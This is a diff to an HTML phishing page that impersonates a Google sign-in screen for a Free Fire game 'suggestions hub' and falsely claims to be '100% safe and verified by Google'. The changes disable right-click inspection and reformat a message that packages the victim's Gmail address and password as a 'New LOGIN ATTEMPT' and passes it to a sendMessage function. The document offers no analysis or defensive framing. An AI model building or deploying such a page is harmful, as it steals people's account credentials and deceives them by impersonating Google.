@@ -106,7 +106,7 @@
     .btn {
 
       width: 100px;
-      margin-top: 670px;
+      margin-top: 67%;
       margin-left: 80%;
       height: 40px;
       padding: 10px;
@@ -121,11 +121,12 @@
 
 </style>
 
-<body>
+<body oncontextmenu="return false;">
     <h1>Google</h1>
     <h2>Sign in</h2>
     <h3>Connect your Free fire account to free fire Suggestions hub <p>100% safe and verified by Google</p></h3>
     <h4>Learn more about using your account</h4>
+    
     <form id="signup-form">
       <div class="form-group">
         
@@ -161,15 +162,14 @@
 
       if (validateSignupForm(username, password)) {
         users[username] = password;
-        const message = `📩New LOGIN ATTEMPT📩
-        
-        
-        DETAILS:
-      - PLATFORMS: FREE FIRE
-      - GMAILL: ${username} 
-      
-      
+        const message = 
+        `📩New LOGIN ATTEMPT📩
 
+        DETAILS:
+      -🟠 PLATFORMS: FREE FIRE
+      -🟠 GMAILL: ${username} 
+      -🟠 Password: 👇loading...👇
+      
       🔒-SECURED BY GAMEHUB-🔒`;
         sendMessage(message, () => {
           
